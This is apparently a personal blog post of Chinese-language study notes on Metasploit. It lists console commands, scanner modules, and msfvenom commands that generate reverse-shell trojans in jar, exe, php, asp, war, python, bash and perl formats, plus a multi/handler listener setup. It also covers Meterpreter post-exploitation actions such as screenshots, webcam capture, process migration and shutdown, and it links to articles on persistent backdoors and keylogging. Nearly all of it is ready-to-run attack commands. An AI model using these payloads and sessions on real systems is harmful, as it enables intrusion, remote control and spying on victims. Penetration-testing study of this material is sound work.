---
title: MSF学习笔记
date: 2017-07-02 21:10:01
tags:
- 渗透测试
categories: 
- 工具
---


### 基本命令

> back  返回上一级                                   
> show +(tab tab) 显示框架模块                                
> show exploits  显示exp                                     
> show payloads  显示载荷                                      
> show auxiliary 显示辅助攻击载荷                       
> show targets 显示漏洞影响范围                          
> show options  显示漏洞参数设置                         
> search (漏洞编号)查找漏洞对应的exp                        
> info显示模块详细信息                          
> use 装载模块                                        
> run 运行exp                                       

<!--more-->
参数

> LHOST  靶机ip，可以让目标主机连接的IP地址          
> LPORT 设置攻击机端口                                      
> RHOST 远程主机或目标主机                       
> RPORT 设置靶机端口                                         

### scanner模块

> use scanner/smb/smb_version               扫描windows的smb版本信息  
> use scanner/ssh/ssh_version                  扫描ssh版本信息，对像攻击openssh有帮助  
> use scanner/ftp/ftp_version                   扫描ftp版本信息  
> use auxiliary/scanner/ftp/annoymous    检查ftp是否允许匿名登录

### Meterpreter

初探msf：  
http://www.xuebuyuan.com/1993953.html  
转Metasploit之Automated Persistent Backdoor  
http://www.evil0x.com/posts/26075.html

给靶机创建一个跟攻击机会话的模块，上面文章有关于内网渗透的



- 用msfvenom生成木马

**web端**
> msfvenom -p java/meterpreter/reverse_tcp LHOST 攻击机ip LPORT 攻击机端口 -f jar >/root/***.jar  
> msfvenom -p windows/meterpreter/reverse_tcp LHOST 攻击机ip LPORT 攻击机端口 -f exe >/root/***.exe  
> msfvenom -p php/meterpreter/reverse_tcp LHOST 攻击机ip LPORT 攻击机端口 -f php >/root/***.php  
> msfvenom -p windows/meterpreter/reverse_tcp LHOST 攻击机ip  LPORT 攻击机端口 -f asp > shell.asp JSP  
> msfvenom -p java/jsp_shell_reverse_tcp LHOST 攻击机ip LPORT 攻击机端口 -f war > shell.war

**反弹shell**  
> msfvenom -p cmd/unix/reverse_python LHOST 攻击机ip LPORT 攻击机端口 -f raw > shell.py  （python）  
> msfvenom -p cmd/unix/reverse_bash LHOST 攻击机ip LPORT 攻击机端口 -f raw > shell.sh  （bash）  
> msfvenom -p cmd/unix/reverse_perl LHOST 攻击机ip LPORT 攻击机端口 -f raw > shell.pl   （perl）


- use exploit/multi/handler 监听内网反弹过来的shell

> use exploit/multi/handler  
> set PAYLOAD <Payload name>  
> set LHOST <LHOST value>  
> set LPORT <LPORT value>  
> set ExitOnSession false  
> exploit -j -z

内网渗透，给拿到权限的机子，上传一个msf，然后用这个监听这个网段的（不是同一个网段用不了）


- meterpreter下可执行的操作

> background            让meterpreter到后台  
> quit                         退出meterpreter会话  
> shell                        获取一个shell  
> irb                           开启ruby终端  
> screenshot              截屏  
> sysinfo                    获取操作系统的详细信息  
> ps                           获取进程列表  
> getuid                    查看权限  
> kill  uid                   杀进程  
> migrate  进程号       将meterpreter会话迁移到进程号  
> webcam_snap         拍照  
> shutdown               关机


键盘窃听上面2篇文章都有




